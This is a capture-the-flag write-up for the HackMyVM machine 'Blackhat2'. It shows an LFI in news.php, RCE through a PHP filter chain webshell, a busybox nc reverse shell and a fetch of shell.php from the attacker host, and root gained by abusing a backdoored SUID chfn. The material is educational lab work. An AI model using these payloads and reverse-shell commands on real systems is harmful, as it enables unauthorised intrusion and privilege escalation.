# Blackhat2

## Blackhat 2

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.98:22
Open 10.0.2.98:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.98
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 04:2a:cb:c4:54:0e:de:54:a1:f2:61:d7:6a:29:f6:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBUIyR90zqbTcOv6QWBqWJd9VdbWlQGf7cvk2FHPkzLIcHPHFn07VAZ3uxnFKlIDFytteuJ2qtVlhmK5TMnBxxg=
|   256 a8:02:05:f3:a6:61:7d:e8:8b:e5:6f:1c:5b:7b:5b:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMN5dOXWLsMESN+NWjIo49NYaAJl8lCuoiTtA8zxqdSF
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Home - Hacked By sML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/blackhat2/writeup.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.98 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET      283l     4833w    31875c http://10.0.2.98/2021
200      GET      250l     5201w    34213c http://10.0.2.98/2022
200      GET       42l       80w      996c http://10.0.2.98/index.html
200      GET       42l       80w      996c http://10.0.2.98/index.php
200      GET     1787l    10605w   867898c http://10.0.2.98/hacker.webp
200      GET       42l       80w      996c http://10.0.2.98/
200      GET      139l      266w     3418c http://10.0.2.98/news.php
```

### LFI

I thought it would be SQLi, but it's LFI

![writeup-1.png](/assets/pentest/hackmyvm/blackhat2/writeup-1.png)

```bash
â””â”€$ curl -s 'http://10.0.2.98/news.php?email=whatever&year=/etc/passwd' | htmlq -t textarea | grep sh$
root:x:0:0:root:/root:/bin/bash
sml:x:1000:1000:,,,:/home/sml:/bin/bash
```

```bash
â””â”€$ curl -s 'http://10.0.2.98/news.php?email=whatever' -G --data-urlencode 'year=php://filter/convert.base64-encode/resource=/var/www/html/news.php' | htmlq -t textarea | base64 -d
<?php
session_start();

if (isset($_GET['email'])) {
    $_SESSION["email"] = $_GET['email'];
}

$fileContent = '';

if (isset($_GET['year'])) {
    ob_start();
    include($_GET['year']);
    $fileContent = ob_get_clean();
}
?>
```

PHP wrappers work, I wanted to see if I could use log files to gain RCE but no luck
```bash
â””â”€$ ffuf -u 'http://10.0.2.98/news.php?email=whatever&year=php%3A//filter/convert.base64-encode/resource%3DFUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 3917
/etc/passwd             [Status: 200, Size: 5537, Words: 1571, Lines: 150, Duration: 8ms]
/etc/hosts.allow        [Status: 200, Size: 4465, Words: 1571, Lines: 150, Duration: 10ms]
/etc/fstab              [Status: 200, Size: 4993, Words: 1571, Lines: 150, Duration: 22ms]
/etc/hosts              [Status: 200, Size: 4177, Words: 1571, Lines: 150, Duration: 22ms]
/etc/networks           [Status: 200, Size: 3997, Words: 1571, Lines: 150, Duration: 8ms]
/etc/hosts.deny         [Status: 200, Size: 4865, Words: 1571, Lines: 150, Duration: 15ms]
/etc/profile            [Status: 200, Size: 4945, Words: 1571, Lines: 150, Duration: 13ms]
/etc/resolv.conf        [Status: 200, Size: 3949, Words: 1571, Lines: 150, Duration: 1ms]
/etc/ssh/sshd_config    [Status: 200, Size: 8197, Words: 1571, Lines: 150, Duration: 5ms]
/etc/ssh/ssh_config     [Status: 200, Size: 6117, Words: 1571, Lines: 150, Duration: 10ms]
/proc/filesystems       [Status: 200, Size: 4381, Words: 1571, Lines: 150, Duration: 7ms]
/proc/cpuinfo           [Status: 200, Size: 5205, Words: 1571, Lines: 150, Duration: 14ms]
/proc/interrupts        [Status: 200, Size: 5789, Words: 1571, Lines: 150, Duration: 11ms]
/proc/modules           [Status: 200, Size: 9393, Words: 1571, Lines: 150, Duration: 10ms]
/proc/meminfo           [Status: 200, Size: 5885, Words: 1571, Lines: 150, Duration: 13ms]
/proc/ioports           [Status: 200, Size: 5701, Words: 1571, Lines: 150, Duration: 18ms]
/proc/self/net/arp      [Status: 200, Size: 4341, Words: 1571, Lines: 150, Duration: 4ms]
/proc/version           [Status: 200, Size: 4169, Words: 1571, Lines: 150, Duration: 12ms]
/proc/mounts            [Status: 200, Size: 6289, Words: 1571, Lines: 150, Duration: 22ms]
/proc/stat              [Status: 200, Size: 4905, Words: 1571, Lines: 150, Duration: 23ms]
/proc/swaps             [Status: 200, Size: 4057, Words: 1571, Lines: 150, Duration: 14ms]
/var/log/wtmp           [Status: 200, Size: 15181, Words: 1571, Lines: 150, Duration: 2ms]
/var/run/utmp           [Status: 200, Size: 5453, Words: 1571, Lines: 150, Duration: 15ms]
/etc/adduser.conf       [Status: 200, Size: 7973, Words: 1571, Lines: 150, Duration: 19ms]
/etc/apache2/envvars    [Status: 200, Size: 6293, Words: 1571, Lines: 150, Duration: 8ms]
/etc/apache2/mods-available/dir.conf [Status: 200, Size: 4021, Words: 1571, Lines: 150, Duration: 2ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 14069, Words: 1571, Lines: 150, Duration: 3ms]
/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 4413, Words: 1571, Lines: 150, Duration: 3ms]
/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 4021, Words: 1571, Lines: 150, Duration: 5ms]
/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 8197, Words: 1571, Lines: 150, Duration: 4ms]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 4909, Words: 1571, Lines: 150, Duration: 15ms]
/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 5481, Words: 1571, Lines: 150, Duration: 21ms]
/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 4877, Words: 1571, Lines: 150, Duration: 21ms]
/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 14069, Words: 1571, Lines: 150, Duration: 11ms]
/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 4413, Words: 1571, Lines: 150, Duration: 16ms]
/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 8089, Words: 1571, Lines: 150, Duration: 10ms]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 4781, Words: 1571, Lines: 150, Duration: 2ms]
/etc/apache2/ports.conf [Status: 200, Size: 4285, Words: 1571, Lines: 150, Duration: 5ms]
/etc/bash.bashrc        [Status: 200, Size: 6577, Words: 1571, Lines: 150, Duration: 9ms]
/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 4749, Words: 1571, Lines: 150, Duration: 25ms]
/etc/bluetooth/main.conf [Status: 200, Size: 19017, Words: 1571, Lines: 150, Duration: 9ms]
/etc/bluetooth/input.conf [Status: 200, Size: 5125, Words: 1571, Lines: 150, Duration: 20ms]
/etc/ca-certificates.conf [Status: 200, Size: 11905, Words: 1571, Lines: 150, Duration: 6ms]
/etc/bluetooth/network.conf [Status: 200, Size: 4077, Words: 1571, Lines: 150, Duration: 11ms]
/etc/default/grub       [Status: 200, Size: 5909, Words: 1571, Lines: 150, Duration: 3ms]
/etc/debian_version     [Status: 200, Size: 3925, Words: 1571, Lines: 150, Duration: 7ms]
/etc/debconf.conf       [Status: 200, Size: 7877, Words: 1571, Lines: 150, Duration: 19ms]
/etc/dhcp/dhclient.conf [Status: 200, Size: 6233, Words: 1571, Lines: 150, Duration: 18ms]
/etc/deluser.conf       [Status: 200, Size: 6193, Words: 1571, Lines: 150, Duration: 20ms]
/etc/group              [Status: 200, Size: 4825, Words: 1571, Lines: 150, Duration: 3ms]
/etc/hostname           [Status: 200, Size: 3937, Words: 1571, Lines: 150, Duration: 7ms]
/etc/host.conf          [Status: 200, Size: 3929, Words: 1571, Lines: 150, Duration: 11ms]
/etc/group-             [Status: 200, Size: 4821, Words: 1571, Lines: 150, Duration: 15ms]
/etc/kernel-img.conf    [Status: 200, Size: 4109, Words: 1571, Lines: 150, Duration: 4ms]
/etc/issue.net          [Status: 200, Size: 3945, Words: 1571, Lines: 150, Duration: 12ms]
/etc/logrotate.conf     [Status: 200, Size: 4577, Words: 1571, Lines: 150, Duration: 9ms]
/etc/ld.so.conf         [Status: 200, Size: 3965, Words: 1571, Lines: 150, Duration: 15ms]
/etc/ldap/ldap.conf     [Status: 200, Size: 4365, Words: 1571, Lines: 150, Duration: 17ms]
/etc/manpath.config     [Status: 200, Size: 10893, Words: 1571, Lines: 150, Duration: 15ms]
/etc/login.defs         [Status: 200, Size: 20677, Words: 1571, Lines: 150, Duration: 34ms]
/etc/modules            [Status: 200, Size: 4249, Words: 1571, Lines: 150, Duration: 12ms]
/etc/pam.conf           [Status: 200, Size: 4653, Words: 1571, Lines: 150, Duration: 6ms]
/etc/os-release         [Status: 200, Size: 4273, Words: 1571, Lines: 150, Duration: 2ms]
/etc/passwd-            [Status: 200, Size: 5533, Words: 1571, Lines: 150, Duration: 17ms]
/etc/security/access.conf [Status: 200, Size: 10005, Words: 1571, Lines: 150, Duration: 6ms]
/etc/security/group.conf [Status: 200, Size: 8765, Words: 1571, Lines: 150, Duration: 11ms]
/etc/security/namespace.conf [Status: 200, Size: 6101, Words: 1571, Lines: 150, Duration: 11ms]
/etc/security/limits.conf [Status: 200, Size: 7589, Words: 1571, Lines: 150, Duration: 12ms]
/etc/security/sepermit.conf [Status: 200, Size: 4477, Words: 1571, Lines: 150, Duration: 12ms]
/etc/security/time.conf [Status: 200, Size: 6825, Words: 1571, Lines: 150, Duration: 12ms]
/etc/security/pam_env.conf [Status: 200, Size: 7881, Words: 1571, Lines: 150, Duration: 21ms]
/etc/sysctl.conf        [Status: 200, Size: 7057, Words: 1571, Lines: 150, Duration: 1ms]
/etc/timezone           [Status: 200, Size: 3937, Words: 1571, Lines: 150, Duration: 22ms]
/proc/devices           [Status: 200, Size: 4533, Words: 1571, Lines: 150, Duration: 11ms]
/proc/net/udp           [Status: 200, Size: 4261, Words: 1571, Lines: 150, Duration: 7ms]
/proc/net/tcp           [Status: 200, Size: 4317, Words: 1571, Lines: 150, Duration: 14ms]
/proc/self/cmdline      [Status: 200, Size: 3953, Words: 1571, Lines: 150, Duration: 16ms]
/proc/self/stat         [Status: 200, Size: 4337, Words: 1571, Lines: 150, Duration: 6ms]
/proc/self/mounts       [Status: 200, Size: 6289, Words: 1571, Lines: 150, Duration: 18ms]
/proc/self/status       [Status: 200, Size: 5741, Words: 1571, Lines: 150, Duration: 18ms]
/etc/crontab            [Status: 200, Size: 5309, Words: 1571, Lines: 150, Duration: 2913ms]
/etc/anacrontab         [Status: 200, Size: 4453, Words: 1571, Lines: 150, Duration: 3939ms]
/etc/mtab               [Status: 200, Size: 6289, Words: 1571, Lines: 150, Duration: 4987ms]
/etc/issue              [Status: 200, Size: 3953, Words: 1571, Lines: 150, Duration: 5001ms]
/etc/network/interfaces [Status: 200, Size: 4341, Words: 1571, Lines: 150, Duration: 5025ms]
/etc/apache2/apache2.conf [Status: 200, Size: 13489, Words: 1571, Lines: 150, Duration: 5032ms]
/etc/motd               [Status: 200, Size: 4301, Words: 1571, Lines: 150, Duration: 5052ms]
```

### RCE

Another way to get RCE is via PHP Filters Chain
- [https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it)
- [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
â””â”€$ curl -LOs https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/refs/heads/main/php_filter_chain_generator.py

â””â”€$ py php_filter_chain_generator.py --chain '<?php system("id");?>' | tail -1 | tee payload.txt
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

â””â”€$ curl -s "http://10.0.2.98/news.php?email=whatever&year=$(cat payload.txt)" | htmlq -t textarea | strings
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
# Didnt work
â””â”€$ py php_filter_chain_generator.py --chain '<?php file_put_contents("shell.php",file_get_contents("http://10.0.2.15/shell.php"));?>' | tail -1 | tee payload.txt
# Upload small webshell
â””â”€$ py php_filter_chain_generator.py --chain $'<?php system($_REQUEST[0]);?>' | tail -1 > payload.txt
# Get shell
â””â”€$ curl -s "http://10.0.2.98/news.php?email=whatever&year=$(cat payload.txt)" -G --data-urlencode "0=busybox nc 10.0.2.15 4444 -e /bin/bash" | htmlq -t textarea
â””â”€$ pwncat-cs -lp 4444
[09:40:15] Welcome to pwncat ðŸˆ! 
[09:48:22] received connection from 10.0.2.98:59328 
[09:48:22] 10.0.2.98:59328: registered new host w/ db 
(local) pwncat$
(remote) www-data@blackhat2.hmv:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

```bash
(remote) www-data@blackhat2.hmv:/opt$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/lp.log
bash: curl: command not found
(remote) www-data@blackhat2.hmv:/opt$ wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/lp.log
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 639K Dec 19  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 67K Mar 23  2023 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 48K Mar 23  2023 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 71K Mar 23  2023 /usr/bin/su
-rwsr-xr-x 1 root root 59K Mar 23  2023 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 166K Feb 12  2023 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 23  2023 /usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 23  2023 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35K Mar 23  2023 /usr/bin/umount  --->  BSD/Linux(08-1996)
...
```

The `chfn` program stood out for me because I haven't seen these programs in SUID section before on CTF. After inspecting the sizes the different was drastic. Considering that this machine was hacked it's definitely suspicious.
```bash
(remote) www-data@blackhat2.hmv:/tmp$ ls -l /usr/bin/chfn /usr/bin/chsh
-rwsr-xr-x 1 root root 169256 Feb 12  2023 /usr/bin/chfn
-rwsr-xr-x 1 root root  52880 Mar 23  2023 /usr/bin/chsh

â””â”€$ /bin/ls -l /usr/bin/chfn /usr/bin/chsh
-rwsr-xr-x 1 root root 70888 Aug  5  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 52936 Aug  5  2024 /usr/bin/chsh
```

Later I found out that you should have ran
```bash
(remote) www-data@blackhat2.hmv:/tmp$ dpkg --verify
missing   c /etc/apache2/sites-available/000-default.conf
missing   c /etc/apache2/sites-available/default-ssl.conf
??5?????? c /etc/grub.d/10_linux
??5??????   /usr/bin/chfn
```

`dpkg --verify` checks all files installed by Debian packages against their recorded metadata (checksums, permissions, ownership, etc).

The **8 characters** in `<8 chars> <type> <path>` represent:
1. **S** â†’ size differs
2. **M** â†’ mode (permissions) differ
3. **5** â†’ MD5 checksum differs (content changed)
4. **D** â†’ device major/minor numbers differ
5. **L** â†’ symbolic link target differs
6. **U** â†’ user ownership differs
7. **G** â†’ group ownership differs
8. **T** â†’ timestamp differs  
    `?` means "not checked" (e.g. missing info in database).

```bash
(remote) www-data@blackhat2.hmv:/tmp$ cd /
(remote) www-data@blackhat2.hmv:/$ python3 -m http.server
---
â””â”€$ curl -s "http://10.0.2.98:8000/usr/bin/chfn" -O
â””â”€$ file chfn
chfn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=30c9e72912cc473cbcf5d83c2a588b04e815a522, for GNU/Linux 3.2.0, with debug_info, not stripped
```

[https://dogbolt.org/?id=d67d3e88-af5c-4c63-9ad7-8a88c6df3f4b#BinaryNinja=1360](https://dogbolt.org/?id=d67d3e88-af5c-4c63-9ad7-8a88c6df3f4b#BinaryNinja=1360)

![writeup-2.png](/assets/pentest/hackmyvm/blackhat2/writeup-2.png)

```bash
â””â”€$ strings chfn -n 16 | grep /tmp/system
nohup /tmp/system </dev/null >/dev/null 2>&1 &
```

The SUID binary executes file called `/tmp/system` as root.

```bash
# Create Binary
(remote) www-data@blackhat2.hmv:/$ echo $'#!/bin/bash\ninstall /bin/bash /tmp/rootbash -m4777' | tee /tmp/system
#!/bin/bash
install /bin/bash /tmp/rootbash -m4777

# Make Executable
(remote) www-data@blackhat2.hmv:/$ chmod +x /tmp/system

# Execute
(remote) www-data@blackhat2.hmv:/$ /usr/bin/chfn
Changing the user information for root
Enter the new value, or press ENTER for the default
        Full Name [root]:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:

# Escalate
(remote) www-data@blackhat2.hmv:/$ /tmp/rootbash -p
(remote) root@blackhat2.hmv:/# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Flags

```bash
(remote) root@blackhat2.hmv:/# cat /home/sml/user.txt
156532dab679edf6f8e53c8787a09264
(remote) root@blackhat2.hmv:/# cat /root/root.txt
30f55e2f86961a07e3a181a82f602ed6
```